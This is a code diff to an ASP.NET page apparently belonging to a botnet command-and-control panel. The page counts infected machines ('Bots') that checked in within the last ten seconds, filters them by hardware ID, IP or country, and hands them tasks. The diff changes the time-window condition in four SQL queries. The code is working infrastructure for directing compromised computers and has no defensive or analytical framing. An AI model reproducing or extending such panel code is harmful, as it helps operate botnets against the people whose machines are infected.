@@ -164,7 +164,7 @@ public partial class Tasks : System.Web.UI.Page
 
             if (where != null && where != "")
             {
-                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where", conn))
+                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where (LastConn <= convert(datetime,GETDATE())) AND LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())) AND Country = @Where or IP = @Where or HWID = @Where", conn))
                 {
                     cmd.Parameters.AddWithValue("False", "False");
                     cmd.Parameters.AddWithValue("Where", where);
@@ -178,7 +178,7 @@ public partial class Tasks : System.Web.UI.Page
                     {
                         int CTask = 0;
 
-                        using (SqlCommand cmd = new SqlCommand("select HWID from (select CTask, HWID, DENSE_RANK() over (order by HWID) as rownum from bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) AND Country = @Where or IP = @Where or HWID = @Where) as tbl where tbl.rownum = @i order by CTask", conn))
+                        using (SqlCommand cmd = new SqlCommand("select HWID from (select CTask, HWID, DENSE_RANK() over (order by HWID) as rownum from bots where (LastConn <= convert(datetime,GETDATE())) AND LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())) AND Country = @Where or IP = @Where or HWID = @Where) as tbl where tbl.rownum = @i order by CTask", conn))
                         {
                             cmd.Parameters.AddWithValue("False", "False");
                             cmd.Parameters.AddWithValue("Where", where);
@@ -216,7 +216,7 @@ public partial class Tasks : System.Web.UI.Page
             }
             else
             {
-                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())))", conn))
+                using (SqlCommand cmd = new SqlCommand("select count(distinct HWID) from Bots where (LastConn <= convert(datetime,GETDATE())) AND LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))", conn))
                 {
                     cmd.Parameters.AddWithValue("False", "False");
                     Available = (int)cmd.ExecuteScalar();
@@ -228,7 +228,7 @@ public partial class Tasks : System.Web.UI.Page
                     for (int i = 1; i <= amount; i++)
                     {
                         int CTask = 0;
-                        using (SqlCommand cmd = new SqlCommand("select HWID from (select CTask,HWID, DENSE_RANK() over (order by HWID) as rownum from bots where (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())))) as tbl order by CTask", conn))
+                        using (SqlCommand cmd = new SqlCommand("select HWID from (select CTask,HWID, DENSE_RANK() over (order by HWID) as rownum from bots where (LastConn <= convert(datetime,GETDATE())) AND LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE()))) as tbl order by CTask", conn))
                         {
                             cmd.Parameters.AddWithValue("i", i);
                             Bots[i] = (string)cmd.ExecuteScalar();
